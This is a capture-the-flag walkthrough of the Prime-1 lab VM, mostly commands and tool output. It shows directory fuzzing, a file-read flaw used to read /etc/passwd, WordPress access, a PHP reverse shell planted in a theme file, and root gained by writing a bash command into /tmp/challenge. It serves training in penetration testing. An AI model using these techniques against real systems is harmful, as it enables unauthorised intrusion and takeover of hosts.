# Prime-1 Writeup

Lets start with a network scan
```bash
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                
                                                                                                                                                                                                              
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                             
 192.168.0.123   00:0c:29:da:37:ed      1      60  VMware, Inc.
```
\
Next ,Open Ports 
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:DA:37:ED (VMware)
```
\
Accessing port 80 , we get
\
<img width="1452" height="670" alt="image" src="https://github.com/user-attachments/assets/e8d71dcd-e897-40cb-a046-026f5500260d" />
\
Nothing on the homepage , so i run ffuf
```bash
ffuf -u http://192.168.0.123:80/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.123:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 1ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 3ms]
#                       [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 11ms]
# on at least 2 different hosts [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 10ms]
#                       [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 12ms]
# Copyright 2007 James Fisher [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 24ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 95ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 124ms]
dev                     [Status: 200, Size: 131, Words: 24, Lines: 8, Duration: 2ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 207ms]
#                       [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 207ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 212ms]
javascript              [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 1ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 309ms]
                        [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 310ms]
#                       [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 427ms]
wordpress               [Status: 200, Size: 11019, Words: 464, Lines: 131, Duration: 1631ms]
                        [Status: 200, Size: 136, Words: 8, Lines: 8, Duration: 0ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 0ms]
```
\
Visiting "/dev" endpoint
\
<img width="634" height="260" alt="image" src="https://github.com/user-attachments/assets/18c120c5-f52e-41ff-9648-091100479375" />
\
Nothing again , so next "/wordpress" endpoint
\
<img width="1334" height="774" alt="image" src="https://github.com/user-attachments/assets/5f36f123-e03c-4913-b4a7-422abddd765a" />
\
We now have a wordpress site , so lets use wpscan to check for vuln 
```bash
wpscan --url http://192.168.0.123/wordpress/ -e                                               
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://192.168.0.123/wordpress/ [192.168.0.123]
[+] Started: Sat Jan 31 01:46:12 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.0.123/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.0.123/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.0.123/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.0.123/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.0.123/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://192.168.0.123/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.0.123/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.0.123/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://192.168.0.123/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.0.123/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <===============================================================================================================================> (652 / 652) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:02 <=============================================================================================================================> (2575 / 2575) 100.00% Time: 00:00:02

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <======================================================================================================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <===========================================================================================================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] victor
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Requests Done: 3593
[+] Cached Requests: 8
[+] Data Sent: 1.032 MB
[+] Data Received: 999.1 KB
[+] Memory used: 304.766 MB
[+] Elapsed time: 00:00:09
```
\
Next , i bruteforce vulnerable plugin detection , but nothing important is found
```bash
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.0.123/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2025-07-15T18:17:00.000Z
 | Readme: http://192.168.0.123/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.123/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.0.123/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.0.123/wordpress/wp-content/plugins/akismet/readme.txt
```
\
So i tried bruteforcing the password for user "victor" on wordpress for some time , still no use
\
So i return back and start enumerating with gobuster
```bash
gobuster dir -t 100 -u http://192.168.0.123/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,zip,php.bak -r       
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.123/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php.bak,txt,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/image.php            (Status: 200) [Size: 147]
/dev                  (Status: 200) [Size: 131]
/index.php            (Status: 200) [Size: 136]
/wordpress            (Status: 200) [Size: 11019]
/javascript           (Status: 403) [Size: 299]
/secret.txt           (Status: 200) [Size: 412]
/server-status        (Status: 403) [Size: 301]
Progress: 1323342 / 1323342 (100.00%)
===============================================================
Finished
===============================================================
```
\
We missed a file "secret.txt" in our initial scan!!! 
\
<img width="646" height="298" alt="image" src="https://github.com/user-attachments/assets/0ef6b633-2de6-4abe-923e-9b323f2a8763" />
\
It highlights "fuzzing on a php pages" and "location.txt", so i make a random request "http://192.168.0.123/index.php?id=what"
\
After this i send to burp intruder and use "burp parameter names filelist"
\
<img width="1344" height="469" alt="image" src="https://github.com/user-attachments/assets/725090e7-554f-447d-918a-2af2e2dac6d3" />
\
So here when we run and sort by size of response
\
<img width="1472" height="86" alt="image" src="https://github.com/user-attachments/assets/ef8ca84f-de4d-4e93-818d-86f4cd356ef1" />
\
We see that, the parameter "file" is returning some unusual response size
\
<img width="1226" height="441" alt="image" src="https://github.com/user-attachments/assets/3214ac7b-c94f-4614-830d-bf4fb4264155" />
\
I tried fuzzing for any file path to read files , but i couldnt find anything
\
So i realize that i can try accessing "location.txt" previously mentioned
\
<img width="1213" height="443" alt="image" src="https://github.com/user-attachments/assets/36b510b8-933e-453f-8bdb-aac714531d3c" />
\
So i try finding other php pages with gobuster
```bash
gobuster dir -t 100 -u http://192.168.0.123/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php -r
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.123/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/image.php            (Status: 200) [Size: 147]
/dev                  (Status: 200) [Size: 131]
/javascript           (Status: 403) [Size: 299]
/index.php            (Status: 200) [Size: 136]
/wordpress            (Status: 200) [Size: 11019]
/server-status        (Status: 403) [Size: 301]
Progress: 441114 / 441114 (100.00%)
===============================================================
Finished
===============================================================
```
\
WE find another php page "image.php" and going to "http://192.168.0.123/image.php?secrettier360=location.txt"
\
<img width="1260" height="458" alt="image" src="https://github.com/user-attachments/assets/3e60eb5a-9cc3-4e5c-8f3a-bd91603907b3" />
\
We can see that this parameter allows us to read any file with read permission ,so we check /etc/passwd
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```
\
We see that , we have 2 users victor and saket and also a hint , saying to read "password.txt" in /home/saket
\
so we read it and we get "follow_the_ippsec"
\
<img width="1232" height="421" alt="image" src="https://github.com/user-attachments/assets/fd33b8c6-2cc3-4fa5-b7a6-c8f68ed89f4d" />
\
I tried it as password for both victor and saket via ssh but it was wrong 
\
So i tried to check in the wordpress login page and it worked
\
So i tried the usual overwriting any of the php pages of the current theme in use and get a reverse shell , but these files didnt have write permissions
\
<img width="1674" height="682" alt="image" src="https://github.com/user-attachments/assets/3bdf5559-aa0d-4695-ab17-f41131b3102f" />
\
So instead i try to upload a theme with already a malicious php page
\
<img width="1694" height="602" alt="image" src="https://github.com/user-attachments/assets/ef4173f1-2a26-4340-8c48-4be1bf72bfd6" />
\
But that also failed
<img width="1489" height="235" alt="image" src="https://github.com/user-attachments/assets/5d74fb1e-54a5-4821-b4fd-1c9ad9ae5ec1" />
\
So i started checking for ways like installing a new plugin or something 
\
<img width="1648" height="644" alt="image" src="https://github.com/user-attachments/assets/a969bd47-31cc-4aaf-9067-b54437cc5b4b" />
\
It was a writiable php file (the author played a little) , so i write a php shell ( modified version of PHP PentestMonkey ) and accesss it at "http://192.168.0.123/wordpress/wp-content/themes/twentynineteen/secret.php" to get the reverse shell
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from ubuntu~192.168.0.123-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/ubuntu~192.168.0.123-Linux-x86_64/2026_01_31-08_06_50-048.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@ubuntu:/$ 
```
\
Since we are the user 'www-data' , and we check sudo capabilities 
```bash
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
cd /home/saket
www-data@ubuntu:/home/saket$ ls -la
total 36
drwxr-xr-x 2 root root  4096 Aug 31  2019 .
drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
-rw------- 1 root root    20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
www-data@ubuntu:/home/saket$ cat user.txt 
af3c658dcf9d7190da3153519c003456
www-data@ubuntu:/home/saket$ cat password.txt 
follow_the_ippsec
www-data@ubuntu:/home/saket$ file enc
enc: executable, regular file, no read permission
```
\
So i tried running it using "sudo -u root /home/saket/enc" , but it was asking for a password and the one we have didnt work
\
so i start checking for other interesting files and i found something in /opt
```bash
cd /opt
www-data@ubuntu:/opt$ cd backup/
www-data@ubuntu:/opt/backup$ ls -la
total 12
drwxr-xr-x 3 root root 4096 Aug 30  2019 .
drwxr-xr-x 3 root root 4096 Aug 30  2019 ..
drwxr-xr-x 2 root root 4096 Aug 30  2019 server_database
www-data@ubuntu:/opt/backup$ cd server_database/
www-data@ubuntu:/opt/backup/server_database$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Aug 30  2019 .
drwxr-xr-x 3 root root 4096 Aug 30  2019 ..
-rw-r--r-- 1 root root   75 Aug 30  2019 backup_pass
-rw-r--r-- 1 root root    0 Aug 30  2019 {hello.8}
www-data@ubuntu:/opt/backup/server_database$ cat backup_pass 
your password for backup_database file enc is 

"backup_password"


Enjoy!
```
\
I then give it 
```bash
sudo -u root /home/saket/enc
enter password: backup_password
good
www-data@ubuntu:/opt/backup/server_database$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
But i didnt notice any change in my user roles , so i checked the home directory of saket where "enc" was located  and found extra files (enc.txt , key.txt)
```bash
ls -la /home/saket/
total 44
drwxr-xr-x 2 root root  4096 Jan 31 05:14 .
drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
-rw------- 1 root root    20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
-rw-r--r-- 1 root root   237 Jan 31 05:14 enc.txt
-rw-r--r-- 1 root root   123 Jan 31 05:14 key.txt
-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
```
```bash
cat enc.txt 
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
www-data@ubuntu:/home/saket$ cat key.txt 
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.

```
\
The author hints that , we have to fidn the md5 hash of the string "ippsec"
\
<img width="905" height="665" alt="image" src="https://github.com/user-attachments/assets/04f4917f-0688-48ce-a09b-e7a6a1552dd4" />
\
I tried to do some cipher identification , but after trying for very long , this website helped "https://encode-decode.com/aes-256-ecb-encrypt-online/"
\
<img width="1552" height="484" alt="image" src="https://github.com/user-attachments/assets/a3c60eb6-c7a7-4d89-8517-b1fb7cff3285" />
\
So we got a password for user saket and then we checked sudo capabilities of saket
```bash
saket@ubuntu:~$ sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
```
\
```bash
sudo -u root /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```
\
So i thought it was trying to run /tmp/challenge as root
```bash
saket@ubuntu:~$ echo "/bin/bash -i" > /tmp/challenge
saket@ubuntu:~$ chmod +x /tmp/challenge 
saket@ubuntu:~$ sudo -u root /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/root# cat root.txt 
b2b17036da1de94cfb024540a8e7075a
```
\
The End , Thank You for reading till here
